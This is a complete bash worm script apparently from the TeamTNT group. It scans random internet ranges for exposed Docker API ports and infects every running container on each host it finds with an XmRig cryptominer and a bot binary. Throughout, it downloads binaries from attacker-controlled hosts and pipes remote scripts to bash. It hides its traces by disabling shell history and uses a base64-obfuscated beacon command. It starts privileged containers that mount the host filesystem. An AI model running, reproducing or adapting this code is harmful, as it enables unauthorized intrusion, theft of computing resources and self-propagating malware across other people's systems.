#!/bin/bash
# Script Name:  Docker-API Infect - IP.Ranges
# Beschreibung: Infiziert alle Docker-Container eines x86_64 Systems mit XmRig.
#               Die Datei /.dockerenv wird durch XmRig ersetzt und gestartet. 
# Autor:        hilde@teamtnt.red
# Version:      0.14.0
# Datum:        25.07.2021

export LC_ALL=C.UTF-8 2>/dev/null 1>/dev/null
export LANG=C.UTF-8 2>/dev/null 1>/dev/null
HISTCONTROL="ignorespace${HISTCONTROL:+:$HISTCONTROL}" 2>/dev/null 1>/dev/null
export HISTFILE=/dev/null 2>/dev/null 1>/dev/null
HISTSIZE=0 2>/dev/null 1>/dev/null
unset HISTFILE 2>/dev/null 1>/dev/null
export PATH=$PATH:/var/bin:/bin:/sbin:/usr/sbin:/usr/bin
ulimit -n 65535


#	curl -Lk http://chimaera.cc/sh/spr/Docker-API.IP.Range.sh | bash


if [ -d "/etc/.../.docker-api.ip.range.lock/" ]; then exit ; fi
mkdir -p /etc/.../.docker-api.ip.range.lock/ 2>/dev/null 1>/dev/null

pkill masscan 2>/dev/null 1>/dev/null ; pkill pnscan 2>/dev/null 1>/dev/null ; pkill zgrab 2>/dev/null 1>/dev/null 


pull() {
  read proto server path <<< "${1//"/"/ }"
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  while IFS= read -r line ; do 
      [[ "$line" == $'\r' ]] && break
  done <&3
  nul='\0'
  while IFS= read -d '' -r x || { nul=""; [ -n "$x" ]; }; do 
      printf "%s$nul" "$x"
  done <&3
  exec 3>&-
}

HTTP_BIN_SRC="http://dl1.chimaera.cc:443/sugarcrm/themes/default/images/SugarLogic/..."

if ! type jq 2>/dev/null 1>/dev/null;then curl -sLk $HTTP_BIN_SRC/jq/x86_64 -o /usr/bin/jq && chmod +x /usr/bin/jq;fi
if ! type masscan 2>/dev/null 1>/dev/null;then curl -sLk $HTTP_BIN_SRC/masscan/x86_64 -o /usr/bin/masscan && chmod +x /usr/bin/masscan;fi
if ! type zgrab 2>/dev/null 1>/dev/null;then curl -sLk $HTTP_BIN_SRC/zgrab/x86_64 -o /usr/bin/zgrab && chmod +x /usr/bin/zgrab;fi
if ! type pnscan 2>/dev/null 1>/dev/null;then curl -sLk $HTTP_BIN_SRC/pnscan/x86_64 -o /usr/bin/pnscan && chmod +x /usr/bin/pnscan;fi

if ! type docker 2>/dev/null 1>/dev/null;then cd /dev/shm/ 2>/dev/null 1>/dev/null;curl -sLk $HTTP_BIN_SRC/docker/x86_64.tgz -o /dev/shm/docker.tgz
tar xzvf /dev/shm/docker.tgz -C /dev/shm/ 2>/dev/null 1>/dev/null && rm -f /dev/shm/docker.tgz 2>/dev/null 1>/dev/null
mv /dev/shm/docker/* /usr/bin/ 2>/dev/null 1>/dev/null; rm -fr /dev/shm/docker/ 2>/dev/null 1>/dev/null;fi


BIN_CURL="http://85.214.149.236:443/sugarcrm/themes/default/images/SugarLogic/.../curl/$(uname -m)"
BIN_BOT="http://85.214.149.236:443/sugarcrm/themes/default/images/SugarLogic/.../TNTb/$(uname -m)"
BIN_PNSCAN="http://85.214.149.236:443/sugarcrm/themes/default/images/SugarLogic/.../pnscan/$(uname -m)"
BIN_JQ="http://85.214.149.236:443/sugarcrm/themes/default/images/SugarLogic/.../jq/$(uname -m)"
BIN_MASSCAN="http://85.214.149.236:443/sugarcrm/themes/default/images/SugarLogic/.../masscan/x86_64"
BIN_ZGRAB="http://85.214.149.236:443/sugarcrm/themes/default/images/SugarLogic/.../zgrab/$(uname -m)"
BIN_XMR="http://85.214.149.236:443/sugarcrm/themes/default/images/SugarLogic/.../xmr/$(uname -m)"
BINS_DOCKER="http://85.214.149.236:443/sugarcrm/themes/default/images/SugarLogic/.../docker/$(uname -m).tgz"

SO_LIBPCAP="http://chimaera.cc/bin/libpcap.so"
CERT_DOCKER="http://chimaera.cc/data/ca.pem"
SRC_PNSCAN="http://chimaera.cc/bin/pnscan_1.14.1.orig.tar.gz"
KUBEN2BASH="http://chimaera.cc/sh/kuben2.sh"


	if ! type curl 2>/dev/null 1>/dev/null; then 
	pull $BIN_CURL > /usr/bin/curl
	chmod +x /usr/bin/curl 2>/dev/null 1>/dev/null
	fi

curl -sLk https://iplogger.org/1A4Cu7 -o /dev/null


VIC_O_IP=$(curl -sLk ipv4.icanhazip.com)
HTTP_SRC="hhttp://chimaera.cc/bin/x86_64"

curl -Lk http://chimaera.cc/sh/setup/my.xmr.sh | bash

T1O=10
T2O=60

if [ ! -d "/.../" ]; then mkdir -p /.../ 2>/dev/null 1>/dev/null ; fi
if [ ! -f "/.../.dockerenv" ]; then pull $BIN_XMR > /.../.dockerenv  ; fi
if [ ! -f "/.../dockerd" ]; then pull $BIN_BOT > /.../dockerd ; fi


function INIT_MAIN(){
SETUP_DOCKER_INFECT
SCAN_DOCKER
}

function SETUP_DOCKER_INFECT(){

function CHECK_SETUP(){
BINARY=$1
APKPACK=$2
APTPACK=$3
YUMPACK=$4
if ! type $BINARY 2>/dev/null 1>/dev/null; then 
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add $APKPACK 2>/dev/null 1>/dev/null ; fi
if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y $APTPACK 2>/dev/null 1>/dev/null; apt-get install -y $APTPACK --reinstall 2>/dev/null 1>/dev/null ; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y $YUMPACK 2>/dev/null 1>/dev/null; yum reinstall -y $YUMPACK 2>/dev/null 1>/dev/null ; fi
fi
}

CHECK_SETUP sudo sudo sudo sudo
CHECK_SETUP bash bash bash bash
CHECK_SETUP curl curl curl curl
CHECK_SETUP wget wget wget wget

CHECK_SETUP chmod coreutils coreutils coreutils
CHECK_SETUP chattr e2fsprogs e2fsprogs e2fsprogs
CHECK_SETUP ps procps procps procps
CHECK_SETUP ip iproute2 iproute2 iproute2
CHECK_SETUP iptables iptables iptables iptables
CHECK_SETUP grep grep grep grep

CHECK_SETUP gcc gcc gcc gcc
CHECK_SETUP make make make make
CHECK_SETUP git git git git
CHECK_SETUP strings binutils binutils binutils
CHECK_SETUP sort coreutils coreutils coreutils

CHECK_SETUP lspci pciutils pciutils pciutils
CHECK_SETUP lscpu util-linux util-linux util-linux

CHECK_SETUP jq jq jq jq
CHECK_SETUP pnscan pnscan pnscan pnscan
CHECK_SETUP masscan masscan masscan masscan
CHECK_SETUP docker docker docker.io docker-ce




### ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ###

if ! type jq 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y jq 2>/dev/null 1>/dev/null; apt-get install -y --reinstall jq 2>/dev/null 1>/dev/null; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y jq 2>/dev/null 1>/dev/null; yum reinstall -y jq 2>/dev/null 1>/dev/null; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add jq 2>/dev/null 1>/dev/null; fi ; fi
	if ! type jq 2>/dev/null 1>/dev/null; then pull $BIN_JQ > /usr/bin/jq ; chmod +x /usr/bin/jq 2>/dev/null 1>/dev/null ; fi
	if ! type jq 2>/dev/null 1>/dev/null; then wget -q $BIN_JQ -O /usr/bin/jq ; chmod +x /usr/bin/jq 2>/dev/null 1>/dev/null ; fi
	if ! type jq 2>/dev/null 1>/dev/null; then wge -q $BIN_JQ -O /usr/bin/jq ; chmod +x /usr/bin/jq 2>/dev/null 1>/dev/null ; fi
	if ! type jq 2>/dev/null 1>/dev/null; then wdl -q $BIN_JQ -O /usr/bin/jq ; chmod +x /usr/bin/jq 2>/dev/null 1>/dev/null ; fi
	if ! type jq 2>/dev/null 1>/dev/null; then wd1 -q $BIN_JQ -O /usr/bin/jq ; chmod +x /usr/bin/jq 2>/dev/null 1>/dev/null ; fi
	if ! type jq 2>/dev/null 1>/dev/null; then curl -s $BIN_JQ -o /usr/bin/jq ; chmod +x /usr/bin/jq 2>/dev/null 1>/dev/null ; fi
	if ! type jq 2>/dev/null 1>/dev/null; then cur -s $BIN_JQ -o /usr/bin/jq ; chmod +x /usr/bin/jq 2>/dev/null 1>/dev/null ; fi
	if ! type jq 2>/dev/null 1>/dev/null; then cdl -s $BIN_JQ -o /usr/bin/jq ; chmod +x /usr/bin/jq 2>/dev/null 1>/dev/null ; fi
	if ! type jq 2>/dev/null 1>/dev/null; then cd1 -s $BIN_JQ -o /usr/bin/jq ; chmod +x /usr/bin/jq 2>/dev/null 1>/dev/null ; fi
		jq --help 2>/dev/null 1>/dev/null
		CHECK_JQ=$? ; if [ "$CHECK_JQ" = "0" ]; then 
		echo ""
		#echo "$VIC_O_IP - JQ is working!"
		else 
		echo "$VIC_O_IP - JQ NOT working!" ; exit
		fi

if ! type pnscan 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null ; apt-get install -y pnscan 2>/dev/null 1>/dev/null ; apt-get install -y --reinstall pnscan 2>/dev/null 1>/dev/null ; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null ; yum install -y pnscan 2>/dev/null 1>/dev/null ; yum reinstall -y pnscan 2>/dev/null 1>/dev/null ; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null ; apk add pnscan 2>/dev/null 1>/dev/null ; fi ; fi

	if ! type pnscan 2>/dev/null 1>/dev/null; then
	cd /var/tmp/ 2>/dev/null 1>/dev/null
	pull $SRC_PNSCAN > /var/tmp/pnscan_1.14.1.orig.tar.gz
	tar xvf /var/tmp/pnscan_1.14.1.orig.tar.gz -C /var/tmp/ 2>/dev/null 1>/dev/null && rm -fr /var/tmp/pnscan_1.14.1.orig.tar.gz 2>/dev/null 1>/dev/null
	cd /var/tmp/pnscan-1.14.1/ 2>/dev/null 1>/dev/null
	./configure 2>/dev/null 1>/dev/null && make 2>/dev/null 1>/dev/null
	cp /var/tmp/pnscan-1.14.1/pnscan /usr/bin/pnscan 2>/dev/null 1>/dev/null
	chmod 755 /usr/bin/pnscan 2>/dev/null 1>/dev/null
	chmod +x /usr/bin/pnscan 2>/dev/null 1>/dev/null
	make install 2>/dev/null 1>/dev/null
	cd / 2>/dev/null 1>/dev/null
	rm -fr /var/tmp/pnscan-1.14.1/ 2>/dev/null 1>/dev/null
	fi

		if ! type pnscan 2>/dev/null 1>/dev/null; then pull $BIN_PNSCAN > /usr/bin/pnscan ; chmod +x /usr/bin/pnscan 2>/dev/null 1>/dev/null ; fi
		if ! type pnscan 2>/dev/null 1>/dev/null; then wget -q $BIN_PNSCAN -O /usr/bin/pnscan ; chmod +x /usr/bin/pnscan 2>/dev/null 1>/dev/null ; fi
		if ! type pnscan 2>/dev/null 1>/dev/null; then curl -s $BIN_PNSCAN -o /usr/bin/pnscan ; chmod +x /usr/bin/pnscan 2>/dev/null 1>/dev/null ; fi
		if ! type pnscan 2>/dev/null 1>/dev/null; then cd1 -s $BIN_PNSCAN -o /usr/bin/pnscan ; chmod +x /usr/bin/pnscan 2>/dev/null 1>/dev/null ; fi
		/usr/bin/pnscan 127.0.0.0/24 22 2>/dev/null 1>/dev/null
		CHECK_PNS=$? ; if [ "$CHECK_PNS" = "0" ]; then 
		echo ""
		#echo "$VIC_O_IP - PnScan is working!"
		else
		echo "$VIC_O_IP - PnScan NOT working!"
		fi



if ! type masscan 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null ; apt-get install -y masscan 2>/dev/null 1>/dev/null ; apt-get install -y --reinstall masscan 2>/dev/null 1>/dev/null ; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null ; yum install -y masscan 2>/dev/null 1>/dev/null ; yum reinstall -y masscan 2>/dev/null 1>/dev/null ; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null ; apk add masscan 2>/dev/null 1>/dev/null ; fi ; fi
	if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null ; apt-get install -y libpcap-dev 2>/dev/null 1>/dev/null ; apt-get install -y --reinstall libpcap-dev 2>/dev/null 1>/dev/null ; fi
	if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null ; yum install -y libpcap-dev 2>/dev/null 1>/dev/null ; yum reinstall -y libpcap-dev 2>/dev/null 1>/dev/null ; fi
	if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null ; apk add libpcap-dev 2>/dev/null 1>/dev/null ; fi

		if ! type masscan 2>/dev/null 1>/dev/null; then pull $BIN_MASSCAN > /usr/bin/masscan
		chmod +x /usr/bin/masscan 2>/dev/null 1>/dev/null ; fi ; masscan 127.0.0.0/24 -p22 2>/dev/null 1>/dev/null
		CHECK_1_MS=$? ; if [ "$CHECK_1_MS" = "0" ]; then 
		echo ""
		#echo "$VIC_O_IP - MasScan is working!"
		else
		if [ ! -d "/usr/lib/x86_64-linux-gnu/" ]; then mkdir -p /usr/lib/x86_64-linux-gnu/ 2>/dev/null 1>/dev/null ; fi 
		pull $SO_LIBPCAP > /usr/lib/x86_64-linux-gnu/libpcap.so
		export LD_PRELOAD="/usr/lib/x86_64-linux-gnu/libpcap.so" ; masscan 127.0.0.0/24 -p22 2>/dev/null 1>/dev/null
		CHECK_2_MS=$? ; if [ "$CHECK_2_MS" = "0" ]; then 
		echo ""
		#echo "$VIC_O_IP - MasScan is working!"
		else
		unset LD_PRELOAD
		echo "$VIC_O_IP - MasScan NOT working!" ; exit ; fi ; fi

if ! type docker 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null ; apt-get install -y docker.io 2>/dev/null 1>/dev/null ; apt-get install -y --reinstall docker.io 2>/dev/null 1>/dev/null ; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null ; yum install -y docker 2>/dev/null 1>/dev/null ; yum reinstall -y docker 2>/dev/null 1>/dev/null ; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null ; apk add docker 2>/dev/null 1>/dev/null ; fi ; fi
		if ! type docker 2>/dev/null 1>/dev/null; then curl -sLk https://get.docker.com | bash 2>/dev/null 1>/dev/null ; fi
if ! type docker 2>/dev/null 1>/dev/null; then cd /var/tmp/ 2>/dev/null 1>/dev/null
curl -sLk $BINS_DOCKER -o /var/tmp/docker-20.10.7.tgz
tar xzvf /var/tmp/docker-20.10.7.tgz 2>/dev/null 1>/dev/null && rm -f /var/tmp/docker-20.10.7.tgz 2>/dev/null 1>/dev/null
cp /var/tmp/docker/* /usr/bin/ 2>/dev/null 1>/dev/null
sudo nohup dockerd 2>/dev/null 1>/dev/null &
	if [ "$($?)" != "0" ]; then
	nohup dockerd 2>/dev/null 1>/dev/null &
	fi
if [ "$($?)" != "0" ]; then
nohup dockerd 2>/dev/null 1>/dev/null &
fi ; fi
	docker --help 2>/dev/null 1>/dev/null ; CHECK_DOCKER=$?
	if [ "$CHECK_DOCKER" = "0" ]; then 
	echo ""
	#echo "$VIC_O_IP - Docker is working!"
	#sudo groupadd docker 2>/dev/null 1>/dev/null
	#sudo usermod -aG docker $USER 2>/dev/null 1>/dev/null
	if [ ! -d "~/.docker/" ]; then mkdir -p ~/.docker/ 2>/dev/null 1>/dev/null ; fi	
	if [ ! -f "~/.docker/ca.pem" ]; then pull $CERT_DOCKER >> ~/.docker/ca.pem ; fi	
	#sudo chown "$USER":"$USER" ~/.docker -R 2>/dev/null 1>/dev/null
	#sudo chmod g+rwx ~/.docker/ -R 2>/dev/null 1>/dev/null
	else 
	echo "$VIC_O_IP - Docker NOT working!" ; exit ; fi


if ! type zgrab 2>/dev/null 1>/dev/null;then
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null;apk add go 2>/dev/null 1>/dev/null;apk add git 2>/dev/null 1>/dev/null;apk add gcc 2>/dev/null 1>/dev/null;apk add make 2>/dev/null 1>/dev/null;fi
if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null;apt-get install -y golang 2>/dev/null 1>/dev/null;apt-get install -y git 2>/dev/null 1>/dev/null;apt-get install -y gcc 2>/dev/null 1>/dev/null;apt-get install -y make 2>/dev/null 1>/dev/null;fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null;yum install -y golang 2>/dev/null 1>/dev/null;yum install -y git 2>/dev/null 1>/dev/null;yum install -y gcc 2>/dev/null 1>/dev/null;yum install -y make 2>/dev/null 1>/dev/null;fi
    export GOPATH=/root/go
    go get github.com/zmap/zgrab
    cd /root/go/src/github.com/zmap/zgrab/
    go build 
    cp ./zgrab /usr/bin/zgrab
    chmod +x /usr/bin/zgrab
fi


if ! type zgrab 2>/dev/null 1>/dev/null;then
pull $BIN_ZGRAB > /usr/bin/zgrab
chmod +x /usr/bin/zgrab
fi

if ! type zgrab 2>/dev/null 1>/dev/null;then echo "$VIC_O_IP - zgrab NOT working!" ; exit ; fi

### ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ###




if ! type pnscan 2>/dev/null 1>/dev/null; then 
pull $BIN_PNSCAN > /usr/bin/pnscan
chmod +x /usr/bin/pnscan 2>/dev/null 1>/dev/null ; fi
/usr/bin/pnscan 127.0.0.0/24 22 2>/dev/null 1>/dev/null
CHECK_PNS=$?
if [ "$CHECK_PNS" = "0" ]; then 
echo ""
#echo "$VIC_O_IP - PnScan is working!"
else
echo "$VIC_O_IP - PnScan NOT working!"
fi


if ! type jq 2>/dev/null 1>/dev/null; then 
pull $BIN_JQ > /usr/bin/jq
chmod +x /usr/bin/jq 2>/dev/null 1>/dev/null ; fi
jq --help 2>/dev/null 1>/dev/null
CHECK_JQ=$?
if [ "$CHECK_JQ" = "0" ]; then 
echo ""
#echo "$VIC_O_IP - JQ is working!"
else
echo "$VIC_O_IP - JQ NOT working!" ; exit
fi


if ! type masscan 2>/dev/null 1>/dev/null; then 
pull $BIN_MASSCAN > /usr/bin/masscan
chmod +x /usr/bin/masscan 2>/dev/null 1>/dev/null ; fi
masscan 127.0.0.0/24 -p22 2>/dev/null 1>/dev/null
CHECK_1_MS=$?
if [ "$CHECK_1_MS" = "0" ]; then 
echo ""
#echo "$VIC_O_IP - MasScan is working!"
else
if [ ! -d "/usr/lib/x86_64-linux-gnu/" ]; then mkdir -p /usr/lib/x86_64-linux-gnu/ 2>/dev/null 1>/dev/null ; fi 
pull $SO_LIBPCAP > /usr/lib/x86_64-linux-gnu/libpcap.so
export LD_PRELOAD="/usr/lib/x86_64-linux-gnu/libpcap.so"
masscan 127.0.0.0/24 -p22 2>/dev/null 1>/dev/null
CHECK_2_MS=$?
if [ "$CHECK_2_MS" = "0" ]; then 
echo ""
#echo "$VIC_O_IP - MasScan is working!"
else
unset LD_PRELOAD
echo "$VIC_O_IP - MasScan NOT working!" ; exit
fi
fi



if ! ( [ -f "/.dockerd" ] || [ -f "~/.dockerd" ] ); then
curl -sLk -o ~/.dockerd $(curl -sLk http://chimaera.cc/data/bot.txt)
chmod 755 ~/.dockerd ; ~/.dockerd ; fi


}

function DOCKER_INFECT(){
T_IP=$1
T_PORT=$2
if [ -z "$2" ]; then T_PORT=2375 ; fi

D_TARGET="$T_IP:$T_PORT"

echo "DockerAPI - $D_TARGET"

D_ARCHITECTURE=$(timeout -s SIGKILL $T1O docker -H $D_TARGET info | grep 'Architecture' | awk '{print $2}')
if [ "$D_ARCHITECTURE" = "x86_64" ]; then

timeout -s SIGKILL $T2O docker -H $D_TARGET run -d -v /:/host --privileged --net host alpine chroot /host /bin/sh -c "uname -a"


D_CONTAINERS=$(timeout -s SIGKILL $T1O docker -H $D_TARGET ps -q)
if [ ! -z "$D_CONTAINERS" ]; then

for D_CONTAINER in ${D_CONTAINERS[@]}; do
# mount -o rw,remount /
timeout -s SIGKILL $T2O docker -H $D_TARGET exec -d --privileged --user 0 $D_CONTAINER /bin/sh -c "mount -o rw,remount / 2>/dev/null 1>/dev/null" 
timeout -s SIGKILL $T2O docker -H $D_TARGET exec -d --privileged --user 0 $D_CONTAINER /bin/sh -c "rm -f /.dockerenv 2>/dev/null 1>/dev/null" 
timeout -s SIGKILL $T2O docker -H $D_TARGET cp /.../.dockerenv $D_CONTAINER:/ 
timeout -s SIGKILL $T2O docker -H $D_TARGET cp /.../dockerd $D_CONTAINER:/ 
# mount -o remount,exec /
timeout -s SIGKILL $T2O docker -H $D_TARGET exec -d --privileged --user 0 $D_CONTAINER /bin/sh -c "mount -o remount,exec / 2>/dev/null 1>/dev/null"
timeout -s SIGKILL $T2O docker -H $D_TARGET exec -d --privileged --user 0 $D_CONTAINER /bin/sh -c "chmod 755 /.dockerenv 2>/dev/null 1>/dev/null" 
timeout -s SIGKILL $T2O docker -H $D_TARGET exec -d --privileged --user 0 $D_CONTAINER /bin/sh -c "chmod 755 /dockerd 2>/dev/null 1>/dev/null" 
timeout -s SIGKILL $T2O docker -H $D_TARGET exec -d --privileged --user 0 $D_CONTAINER /bin/sh -c "/.dockerenv 2>/dev/null 1>/dev/null"
timeout -s SIGKILL $T2O docker -H $D_TARGET exec -d --privileged --user 0 $D_CONTAINER /bin/sh -c "/dockerd 2>/dev/null 1>/dev/null"
# http://chimaera.cc/log/inf.php
timeout -s SIGKILL $T2O docker -H $D_TARGET exec -d --privileged --user 0 $D_CONTAINER /bin/sh -c "echo aWYgISB0eXBlIGN1cmwgMj4vZGV2L251bGwgMT4vZGV2L251bGw7IHRoZW4gaWYgdHlwZSBhcHQtZ2V0IDI+L2Rldi9udWxsIDE+L2Rldi9udWxsOyB0aGVuIGFwdC1nZXQgdXBkYXRlIC0tZml4LW1pc3NpbmcgMj4vZGV2L251bGwgMT4vZGV2L251bGwgOyBhcHQtZ2V0IGluc3RhbGwgLXkgY3VybCAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbCA7IGFwdC1nZXQgaW5zdGFsbCAteSAtLXJlaW5zdGFsbCBjdXJsIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsIDsgZmkKaWYgdHlwZSB5dW0gMj4vZGV2L251bGwgMT4vZGV2L251bGw7IHRoZW4geXVtIGNsZWFuIGFsbCAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbCA7IHl1bSBpbnN0YWxsIC15IGN1cmwgMj4vZGV2L251bGwgMT4vZGV2L251bGwgOyB5dW0gcmVpbnN0YWxsIC15IGN1cmwgMj4vZGV2L251bGwgMT4vZGV2L251bGwgOyBmaQppZiB0eXBlIGFwayAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbDsgdGhlbiBhcGsgdXBkYXRlIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsIDsgYXBrIGFkZCBjdXJsIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsIDsgZmkgOyBmaSA7IGN1cmwgLXNMayBodHRwOi8vY2hpbWFlcmEuY2MvbG9nL2luZi5waHAgLW8gL2Rldi9udWxsIDsgaGlzdG9yeSAtYyA7IGNsZWFyCgo= | base64 -d | bash"

done

fi
fi

}

function SCAN_DOCKER(){
#for N in $(seq 1 3)
while true; do

if [ -d "/etc/.../KillSwitch.DockerAPI-IP-Range/" ]; then
rm -fr /etc/.../.docker-api.ip.range.lock/ 2>/dev/null 1>/dev/null
exit
fi


T_RANGE=$(curl -s http://chimaera.cc/range.php)
if [ -z "$T_RANGE" ]; then T_RANGE=$(($RANDOM%255+1)) ; fi
	MS_RATE=$(curl -s http://chimaera.cc/data/ms_rate.txt)
	if [ -z "$MS_RATE" ]; then MS_RATE=10000 ; fi

		rm -f /var/tmp/2375 /var/tmp/2376 /var/tmp/2377 /var/tmp/4243 /var/tmp/4244 /var/tmp/.dpwn.txt 2>/dev/null 1>/dev/null

masscan --open -p2375,2376,2377,4243,4244 --rate=$MS_RATE $T_RANGE.0.0.0/16 >> /var/tmp/.dpwn.txt


cat /var/tmp/.dpwn.txt | grep '2375/tcp' | awk '{print $6}' | zgrab --senders 200 --port 2375 --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip >> /var/tmp/2375
cat /var/tmp/.dpwn.txt | grep '2376/tcp' | awk '{print $6}' | zgrab --senders 200 --port 2376 --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip >> /var/tmp/2376
cat /var/tmp/.dpwn.txt | grep '2377/tcp' | awk '{print $6}' | zgrab --senders 200 --port 2377 --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip >> /var/tmp/2377
cat /var/tmp/.dpwn.txt | grep '4243/tcp' | awk '{print $6}' | zgrab --senders 200 --port 4243 --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip >> /var/tmp/4243
cat /var/tmp/.dpwn.txt | grep '4244/tcp' | awk '{print $6}' | zgrab --senders 200 --port 4244 --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip >> /var/tmp/4244

	rm -f /var/tmp/.dpwn.txt 2>/dev/null 1>/dev/null
	find /var/tmp/ -type f -size 0b -exec rm -f {} \; 2>/dev/null 1>/dev/null

if [ -f "/var/tmp/2375" ]; then while read D_TARGET; do DOCKER_INFECT $D_TARGET 2375 ; done < /var/tmp/2375 ; rm -f /var/tmp/2375 ; fi
if [ -f "/var/tmp/2376" ]; then while read D_TARGET; do DOCKER_INFECT $D_TARGET 2376 ; done < /var/tmp/2376 ; rm -f /var/tmp/2376 ; fi
if [ -f "/var/tmp/2377" ]; then while read D_TARGET; do DOCKER_INFECT $D_TARGET 2377 ; done < /var/tmp/2377 ; rm -f /var/tmp/2377 ; fi
if [ -f "/var/tmp/4243" ]; then while read D_TARGET; do DOCKER_INFECT $D_TARGET 4243 ; done < /var/tmp/4243 ; rm -f /var/tmp/4243 ; fi
if [ -f "/var/tmp/4244" ]; then while read D_TARGET; do DOCKER_INFECT $D_TARGET 4244 ; done < /var/tmp/4244 ; rm -f /var/tmp/4244 ; fi

done

rm -fr /etc/.../.docker-api.ip.range.lock/ 2>/dev/null 1>/dev/null

}



INIT_MAIN
